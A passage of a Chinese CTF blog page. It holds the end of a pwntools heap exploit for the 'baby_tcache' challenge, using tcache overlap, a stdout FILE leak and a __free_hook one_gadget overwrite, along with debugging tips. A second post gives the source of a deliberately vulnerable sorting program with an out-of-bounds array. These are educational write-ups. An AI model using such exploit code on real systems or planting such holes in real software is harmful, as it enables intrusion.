class="keyword">def</span> <span class="title">exit</span><span class="params">()</span>:</span></span><br><span class="line">    choice(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span><span class="params">()</span>:</span></span><br><span class="line">    new(<span class="number">0x500</span><span class="number">-0x8</span>) <span class="comment">#0</span></span><br><span class="line">    new(<span class="number">0x30</span>) <span class="comment">#1</span></span><br><span class="line">    new(<span class="number">0x40</span>) <span class="comment">#2</span></span><br><span class="line">    new(<span class="number">0x50</span>) <span class="comment">#3</span></span><br><span class="line">    new(<span class="number">0x60</span>) <span class="comment">#4</span></span><br><span class="line">    new(<span class="number">0x500</span><span class="number">-0x8</span>) <span class="comment">#5</span></span><br><span class="line">    new(<span class="number">0x70</span>) <span class="comment">#6</span></span><br><span class="line">    delete(<span class="number">4</span>)</span><br><span class="line">    new(<span class="number">0x68</span>, <span class="string">"A"</span>*<span class="number">0x60</span> + <span class="string">'\x60\x06'</span>)</span><br><span class="line">    delete(<span class="number">2</span>)</span><br><span class="line">    delete(<span class="number">0</span>)</span><br><span class="line">    delete(<span class="number">5</span>)</span><br><span class="line">    new(<span class="number">0x530</span>)</span><br><span class="line">    delete(<span class="number">4</span>)</span><br><span class="line">    new(<span class="number">0xa0</span>, <span class="string">'\x60\x07'</span>)</span><br><span class="line">    new(<span class="number">0x40</span>, <span class="string">'a'</span>)</span><br><span class="line">    new(<span class="number">0x3e</span>, p64(<span class="number">0xfbad1800</span>)+ p64(<span class="number">0</span>)*<span class="number">3</span> + <span class="string">'\x00'</span>)</span><br><span class="line">    print(repr(io.recv(<span class="number">8</span>)))</span><br><span class="line">    print(<span class="string">'leak!!!!!'</span>)</span><br><span class="line">    info1 = io.recv(<span class="number">8</span>)</span><br><span class="line">    print(repr(info1))</span><br><span class="line">    leak_libc = u64(info1)</span><br><span class="line">    io.success(<span class="string">"leak_libc: 0x%x"</span> % leak_libc)</span><br><span class="line">    libc_base = leak_libc - <span class="number">0x3ed8b0</span></span><br><span class="line">    new(<span class="number">0xa0</span>, p64(libc_base + libc.symbols[<span class="string">'__free_hook'</span>]))</span><br><span class="line">    new(<span class="number">0x60</span>, <span class="string">"A"</span>)</span><br><span class="line">    <span class="comment">#gdb.attach(io)</span></span><br><span class="line">    <span class="comment">#one_gadget = 0x4f2c5 #</span></span><br><span class="line">    one_gadget = <span class="number">0x4f322</span> <span class="comment">#0x10a38c</span></span><br><span class="line">    new(<span class="number">0x60</span>, p64(libc_base + one_gadget))</span><br><span class="line">    delete(<span class="number">0</span>)</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">    </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            exp()</span><br><span class="line">            io.interactive()</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            io.close()</span><br><span class="line">            io = process(<span class="string">'./baby_tcache'</span>)</span><br></pre></td></tr></table></figure>


<h3 id="调试总结"><a href="#调试总结" class="headerlink" title="调试总结"></a>调试总结</h3><p>这些都是自己调试出来的经验，所以个人技巧，不喜欢可以不用 </p>
<h4 id="查看内存部分"><a href="#查看内存部分" class="headerlink" title="查看内存部分"></a>查看内存部分</h4><p>想gdb调试查看这部分内存的话<br>new(0x3e, p64(0xfbad1800)+ p64(0)*3 + ‘\x00’)，<br>不要在之后下断，之后查看的话看不到<br>可以在这句话之前下断</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">b malloc</span><br><span class="line">finish</span><br><span class="line">n</span><br></pre></td></tr></table></figure>
<p>n有好多步，自己测试，这里可以一直按回车，gdb会默认上一条命令，记得查看那时候内存就行x/20gx stdout</p>
<h4 id="gdb附加技巧"><a href="#gdb附加技巧" class="headerlink" title="gdb附加技巧"></a>gdb附加技巧</h4><p>这道题需要爆破，所以附加的不好很麻烦，我是加了个死循环，然后gdb.attach(io)，想要中断的时候在运行exp代码那个终端ctrl+c中断后在关闭gdb附加窗口</p>
<h4 id="计算技巧"><a href="#计算技巧" class="headerlink" title="计算技巧"></a>计算技巧</h4><p>以前我经常用python计算offset，现在都是用gdb命令p  addr1-addr2</p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><ol>
<li>IO_FILE攻击还是nb,能利用基本函数泄露出libc</li>
<li>自己构造起overlap起来还是有点吃力，以后要多练习这部分内容</li>
</ol>
<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/tcache_attack-zh/" target="_blank" rel="noopener">ctf-wiki</a><br><a href="http://dittozzz.top/2019/04/24/IO-FILE部分源码分析及利用/" target="_blank" rel="noopener">IO-FILE部分源码分析及利用</a><br><a href="http://pollux.cc/2019/05/03/2018-hitcon-baby-tcache/" target="_blank" rel="noopener">2018-hitcon-baby-tcache_writeup</a></p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="https://noone-hub.github.io/2019/10/30/pwn/pwn02-patch/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="LiHua">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="NoOne-hub">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2019/10/30/pwn/pwn02-patch/" itemprop="url">pwn/pwn02-patch</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-10-30T09:11:25+08:00">
                2019-10-30
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h1 id="题目修复部分"><a href="#题目修复部分" class="headerlink" title="题目修复部分"></a>题目修复部分</h1><p>题目的点很容易看出，数组越界，不过如何利用这个比较难，我经过一段时间测试，发觉scanf的特性，输入-可以绕过，所以可以泄露cannary，泄露cannary过后可以任意写，然后精确覆盖到cannary过后进行ROP就行了，还有一个点就是输入长度为27的时候，他不会进行排序，这样才能ROP，不过最终我没利用成功，还有一个栈的偏移点我还没搞懂，所以最终也没打出来</p>
<p>修复建议:在读和写的时候都限制数组长度，还有排序的时候考虑长度为27的</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">cmp</span><span class="params">(<span class="keyword">const</span> <span class="keyword">void</span> *a1, <span class="keyword">const</span> <span class="keyword">void</span> *a2)</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> (<span class="keyword">int</span>)(*(<span class="keyword">int</span> *)a1 - *(<span class="keyword">int</span> *)a2);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">sub</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">char</span> v1;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">char</span> v2;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"do you would to sort your girlfriends?[Y/N/@]"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%c"</span>, &amp;v2);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ( v2 == <span class="number">78</span> )</span><br><span class="line"></span><br><span class="line">    &#123;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"goodbye~~~"</span>);</span><br><span class="line"></span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ( v2 == <span class="number">89</span> )</span><br><span class="line"></span><br><span class="line">    &#123;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"goodbye~~~"</span>);</span><br><span class="line"></span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ( v2 != <span class="number">64</span> )</span><br><span class="line"></span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"please answer two questions!"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"1+1999=??\n"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"please answer the question1:"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%c"</span>, &amp;v1);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"1*1999=??\n"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"please answer the question2:"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%c"</span>, &amp;v1);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ( v1 != <span class="number">94</span> )</span><br><span class="line"></span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"you are right~\n"</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">sub2</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">char</span> buf;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"my girlfriend,today is very interesting!!! "</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"nice to meet you!"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"here is a pole! \n"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"please input your name:"</span>);</span><br><span class="line"></span><br><span class="line">    read(<span class="number">0</span>, &amp;buf, <span class="number">0x10</span>uLL);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"hello my destiny!\n"</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">sub1</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> v2; <span class="comment">// [rsp+4h] [rbp-4Ch]</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> i; <span class="comment">// [rsp+8h] [rbp-48h]</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> j; <span class="comment">// [rsp+Ch] [rbp-44h]</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> k; <span class="comment">// [rsp+10h] [rbp-40h]</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> v6; <span class="comment">// [rsp+14h] [rbp-3Ch]</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> v7; <span class="comment">// [rsp+18h] [rbp-38h]</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> v8; <span class="comment">// [rsp+1Ch] [rbp-34h]</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> base[<span class="number">10</span>];</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    v6 = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    v7 = <span class="number">999</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"how many girlfriends do you have?"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;v2);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(v2 &gt; <span class="number">10</span> || v2 &lt; <span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">    &#123;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; v2; ++i )</span><br><span class="line"></span><br><span class="line">    &#123;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"please input your %dth girlfriends:"</span>, i);</span><br><span class="line"></span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;base[i]);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ( v7 != <span class="number">999</span> )</span><br><span class="line"></span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    qsort(base, v2, <span class="number">4u</span>LL, cmp);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"this is the sort result:"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> ( j = <span class="number">0</span>; j &lt; v2; ++j )</span><br><span class="line"></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"%d  "</span>, (<span class="keyword">unsigned</span> <span class="keyword">int</span>)base[j]);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"you can change your girlfriend"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;v2);</span><br><span class="line"></span><br><span class="line">    v8 = v2;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ( !v2 )</span><br><span class="line"></span><br><span class="line">    &#123;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"which girlfriend do you want to change?"</span>);</span><br><span class="line"></span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;v2);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(v2 &gt; <span class="number">10</span> || v2 &lt; <span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">        &#123;</span><br><span class="line"></span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> ( k = <span class="number">0</span>; k &lt; v2; ++k )</span><br><span class="line"></span><br><span class="line">        &#123;</span><br><span class="line"></span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">"now change:"</span>);</span><br><span class="line"></span><br><span class="line">            <span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;base[k]);</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ( v2 &lt;= <span class="number">79</span> &amp;&amp; v2 &gt; <span class="number">39</span> )</span><br><span class="line"></span><br><span class="line">        qsort(base, v2, <span class="number">4u</span>LL, cmp);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ( v2 &lt;= <span class="number">100</span> &amp;&amp; v2 &gt; <span class="number">80</span> )</span><br><span class="line"></span><br><span class="line">        qsort(base, v2, <span class="number">4u</span>LL, cmp);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ( v2 &lt;= <span class="number">64</span> &amp;&amp; v2 &gt; <span class="number">55</span> )</span><br><span class="line"></span><br><span class="line">        qsort(base, v2, <span class="number">4u</span>LL, cmp);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ( v2 &lt;= <span class="number">100</span> )</span><br><span class="line"></span><br><span class="line">    &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> ( v2 &lt;= <span class="number">27</span> || v2 &gt; <span class="number">39</span> )</span><br><span class="line"></span><br><span class="line">        &#123;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> ( v2 &lt;= <span class="number">26</span> )</span><br><span class="line"></span><br><span class="line">                qsort(base, v2, <span class="number">4u</span>LL, cmp);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line"></span><br><span class="line">                qsort(base,v2,<span class="number">4u</span>LL,cmp);</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line"></span><br><span class="line">        &#123;</span><br><span class="line"></span><br><span class="line">            qsort(base, v2, <span class="number">4u</span>LL, cmp);</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line"></span><br><span class="line">    &#123;</span><br><span class="line"></span><br><span class="line">        qsort(base, v2, <span class="number">4u</span>LL, cmp);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//sub();</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//sub2();</span></span><br><span class="line"></span><br><span class="line">    sub1();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
  </section>

  
  <nav class="pagination">
    <a class="extend prev" rel="prev" href="/page/2/">&lt;i class=&quot;fa fa-angle-left&quot;&gt;&lt;&#x2F;i&gt;</a><a class="page-number" href="/">1</a><a class="page-number" href="/page/2/">2</a><span class="page-number current">3</span><a class="page-number" href="/page/4/">4</a><span class="space">&hellip;</span><a class="page-number" href="/page/7/">7</a><a class="extend next" rel="next" href="/page/4/">&lt;i class=&quot;fa fa-angle-right&quot;&gt;&lt;&#x2F;i&gt;</a>
  </nav>



          </div>
          


          

        </div>
        
          
  
  <div class="sidebar-toggle">
    <div class="sidebar-toggle-line-wrap">
      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
    </div>
  </div>

  <aside id="sidebar" class="sidebar">
    
    <div class="sidebar-inner">

      

      

      <section class="site-overview-wrap sidebar-panel sidebar-panel-active">
        <div class="site-overview">
          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
            
              <p class="site-author-name" itemprop="name">LiHua</p>
              <p class="site-description motion-element" itemprop="description">One people that no one know</p>
          </div>

          <nav class="site-state motion-element">

            
              <div class="site-state-item site-state-posts">
              
                <a href="/archives">
              
                  <span class="site-state-item-count">62</span>
                  <span class="site-state-item-name">posts</span>
                </a>
              </div>
            

            
              
              
              <div class="site-state-item site-state-categories">
                <a href="/categories/index.html">
                  <span class="site-state-item-count">7</span>
                  <span class="site-state-item-name">categories</span>
                </a>
              </div>
            

            
              
              
              <div class="site-state-item site-state-tags">
                <a href="/tags/index.html">
                  <span class="site-state-item-count">5</span>
                  <span class="site-state-item-name">tags</span>
                </a>
              </div>
            

          </nav>

          

          

          
          

          
          

          

        </div>
      </section>

      

      

    </div>
  </aside>


        
      </div>
    </main>

    <footer id="footer" class="footer">
      <div class="footer-inner">
        <div class="copyright">&copy; <span itemprop="copyrightYear">2019</span>
  <span class="with-love">
    <i class="fa fa-user"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">LiHua</span>

  
</div>


  <div class="powered-by">Powered by <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a></div>



  <span class="post-meta-divider">|</span>



  <div class="theme-info">Theme &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Gemini</a> v5.1.4</div>




        







        
      </div>
    </footer>

    
      <div class="back-to-top">
        <i class="fa fa-arrow-up"></i>
        
      </div>
    

    

  </div>

  

<script type="text/javascript">
  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
    window.Promise = null;
  }
</script>









  












  
  
    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
  

  
  
    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
  

  
  
    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
  

  
  
    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
  

  
  
    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
  

  
  
    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
  


  


  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>

  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>



  
  


  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>

  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>



  

  


  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>



  


  




	





  





  












  





  

  

  

  
  

  

  

  

</body>
</html>
